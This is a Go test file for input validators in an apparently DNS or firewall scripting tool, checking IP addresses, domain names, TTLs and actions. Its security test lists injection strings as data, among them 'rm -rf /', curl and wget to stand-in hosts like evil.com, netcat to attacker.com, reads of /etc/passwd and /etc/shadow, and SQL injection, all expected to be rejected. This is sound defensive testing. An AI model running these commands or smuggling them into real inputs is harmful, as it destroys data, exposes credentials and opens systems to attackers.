package main

import (
	"fmt"
	"net"
	"regexp"
	"strings"
	"testing"
)

// Simplified validation functions for testing
func validateScriptInputSimple(input string, inputType string) error {
	if input == "" {
		return fmt.Errorf("empty %s not allowed", inputType)
	}
	
	if len(input) > 255 {
		return fmt.Errorf("%s exceeds maximum length of 255 characters", inputType)
	}
	
	switch inputType {
	case "ip":
		return validateIPAddressSimple(input)
	case "domain":
		return validateDomainNameSimple(input)
	case "ttl":
		return validateTTLStringSimple(input)
	case "action":
		return validateActionSimple(input)
	default:
		return fmt.Errorf("unknown input type: %s", inputType)
	}
}

func validateIPAddressSimple(ip string) error {
	if net.ParseIP(ip) == nil {
		return fmt.Errorf("invalid IP address: %s", ip)
	}
	return nil
}

func validateDomainNameSimple(domain string) error {
	domain = strings.TrimSuffix(domain, ".")
	
	if len(domain) == 0 || len(domain) > 253 {
		return fmt.Errorf("invalid domain length: %s", domain)
	}
	
	domainRegex := regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$`)
	if !domainRegex.MatchString(domain) {
		return fmt.Errorf("invalid domain format: %s", domain)
	}
	
	labels := strings.Split(domain, ".")
	for _, label := range labels {
		if len(label) == 0 || len(label) > 63 {
			return fmt.Errorf("invalid domain label length in: %s", domain)
		}
		if strings.HasPrefix(label, "-") || strings.HasSuffix(label, "-") {
			return fmt.Errorf("domain label cannot start or end with hyphen: %s", domain)
		}
	}
	
	return nil
}

func validateTTLStringSimple(ttl string) error {
	ttlRegex := regexp.MustCompile(`^[0-9]+$`)
	if !ttlRegex.MatchString(ttl) {
		return fmt.Errorf("invalid TTL format: %s", ttl)
	}
	return nil
}

func validateActionSimple(action string) error {
	validActions := map[string]bool{
		"ALLOW":  true,
		"DENY":   true,
		"EXPIRE": true,
	}
	
	if !validActions[action] {
		return fmt.Errorf("invalid action: %s", action)
	}
	return nil
}

func TestValidationSecurity(t *testing.T) {
	// Test various injection vectors to ensure they're properly rejected
	injectionVectors := []struct {
		input     string
		inputType string
	}{
		{"; rm -rf /", "domain"},
		{"&& curl evil.com", "domain"},
		{"|| wget malware.sh", "domain"},
		{"`whoami`", "domain"},
		{"$(id)", "domain"},
		{"|nc attacker.com 1234", "domain"},
		{"> /etc/passwd", "domain"},
		{"< /etc/shadow", "domain"},
		{"'; DROP TABLE users; --", "domain"},
		{"\"; system('rm -rf /'); \"", "domain"},
		{"../../../etc/passwd", "domain"},
		{"\n\nmalicious command", "domain"},
		{"\r\ninjected command", "domain"},
		{"192.168.1.1; rm -rf /", "ip"},
		{"2001:db8::1; echo pwned", "ip"},
		{"300; curl evil.com", "ttl"},
		{"ALLOW; /bin/sh", "action"},
	}

	for _, vector := range injectionVectors {
		t.Run(fmt.Sprintf("Injection vector %s (%s)", vector.input, vector.inputType), func(t *testing.T) {
			err := validateScriptInputSimple(vector.input, vector.inputType)
			if err == nil {
				t.Errorf("validateScriptInput(%q, %q) should have rejected injection vector", vector.input, vector.inputType)
			} else {
				t.Logf("PASS: Injection vector rejected: %v", err)
			}
		})
	}
}

func TestValidInputs(t *testing.T) {
	validInputs := []struct {
		input     string
		inputType string
	}{
		{"192.168.1.1", "ip"},
		{"2001:db8::1", "ip"},
		{"example.com", "domain"},
		{"sub.example.com", "domain"},
		{"300", "ttl"},
		{"ALLOW", "action"},
		{"DENY", "action"},
		{"EXPIRE", "action"},
	}

	for _, valid := range validInputs {
		t.Run(fmt.Sprintf("Valid %s: %s", valid.inputType, valid.input), func(t *testing.T) {
			err := validateScriptInputSimple(valid.input, valid.inputType)
			if err != nil {
				t.Errorf("validateScriptInput(%q, %q) should have accepted valid input: %v", valid.input, valid.inputType, err)
			} else {
				t.Logf("PASS: Valid input accepted")
			}
		})
	}
}